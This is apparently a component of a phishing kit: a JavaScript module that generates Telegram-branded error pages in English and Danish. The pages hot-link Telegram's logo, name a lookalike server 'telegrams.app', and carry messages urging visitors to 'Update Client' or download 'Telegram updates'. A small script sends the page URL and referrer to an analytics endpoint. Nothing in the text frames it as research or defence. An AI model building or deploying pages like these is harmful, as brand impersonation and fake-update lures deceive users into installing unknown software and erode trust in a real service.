const ERROR_PAGES = {
  'en': {
    '404': {
      title: 'Page Not Found',
      message: 'The requested Telegram page could not be found. Please check the URL or return to the main page.',
      action: 'Go to Homepage'
    },
    '403': {
      title: 'Access Denied',
      message: 'Your session has expired or is invalid. Please update your Telegram client to continue.',
      action: 'Update Client'
    },
    '429': {
      title: 'Too Many Requests',
      message: 'Please wait a moment before downloading Telegram updates.',
      action: 'Try Again'
    },
    'maintenance': {
      title: 'Scheduled Maintenance',
      message: 'Telegram is performing security updates. Normal service will resume shortly.',
      action: 'Check Status'
    }
  },
  'da': {
    '404': {
      title: 'Siden Blev Ikke Fundet',
      message: 'Den ønskede Telegram-side kunne ikke findes. Tjek venligst URL\'en eller gå tilbage til forsiden.',
      action: 'Gå til Forsiden'
    },
    '403': {
      title: 'Adgang Nægtet',
      message: 'Din session er udløbet eller ugyldig. Opdater venligst din Telegram-klient for at fortsætte.',
      action: 'Opdater Klient'
    },
    '429': {
      title: 'For Mange Anmodninger',
      message: 'Vent venligst et øjeblik før du downloader Telegram-opdateringer.',
      action: 'Prøv Igen'
    },
    'maintenance': {
      title: 'Planlagt Vedligeholdelse',
      message: 'Telegram udfører sikkerhedsopdateringer. Normal service genoptages snarest.',
      action: 'Tjek Status'
    }
  }
};

function generateErrorPage(type, lang, trackingId = null) {
  const error = ERROR_PAGES[lang][type];
  const timestamp = new Date().toISOString();
  
  return `
    <!DOCTYPE html>
    <html lang="${lang}">
    <head>
      <meta charset="UTF-8">
      <title>Telegram - ${error.title}</title>
      <meta name="robots" content="noindex,nofollow">
      <link rel="icon" href="https://telegram.org/favicon.ico">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: #f5f5f5;
          margin: 0;
          padding: 20px;
          color: #333;
        }
        .error-container {
          max-width: 600px;
          margin: 50px auto;
          padding: 30px;
          background: white;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          text-align: center;
        }
        .logo {
          width: 80px;
          height: 80px;
          margin-bottom: 20px;
        }
        .error-code {
          font-size: 24px;
          color: #999;
          margin: 20px 0;
        }
        .error-message {
          font-size: 16px;
          line-height: 1.5;
          margin: 20px 0;
        }
        .error-action {
          background: #0088cc;
          color: white;
          border: none;
          padding: 12px 24px;
          border-radius: 5px;
          font-size: 16px;
          cursor: pointer;
          text-decoration: none;
          display: inline-block;
          margin-top: 20px;
        }
        .error-action:hover {
          background: #006699;
        }
        .error-details {
          margin-top: 30px;
          padding-top: 20px;
          border-top: 1px solid #eee;
          font-size: 12px;
          color: #999;
        }
      </style>
    </head>
    <body>
      <div class="error-container">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram" class="logo">
        <h1>${error.title}</h1>
        <div class="error-code">${type}</div>
        <p class="error-message">${error.message}</p>
        <a href="/" class="error-action">${error.action}</a>
        <div class="error-details">
          ${trackingId ? `Reference ID: ${trackingId}<br>` : ''}
          Timestamp: ${timestamp}<br>
          Server: telegrams.app
        </div>
      </div>
      ${trackingId ? generateErrorTracking(trackingId, type) : ''}
    </body>
    </html>
  `;
}

function generateErrorTracking(trackingId, errorType) {
  return `
    <script>
      // Error tracking
      const errorData = {
        id: '${trackingId}',
        type: '${errorType}',
        timestamp: '${Date.now()}',
        url: window.location.href,
        referrer: document.referrer
      };
      
      // Send error data
      fetch('/error-analytics', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(errorData)
      });
    </script>
  `;
}

module.exports = {
  ERROR_PAGES,
  generateErrorPage
};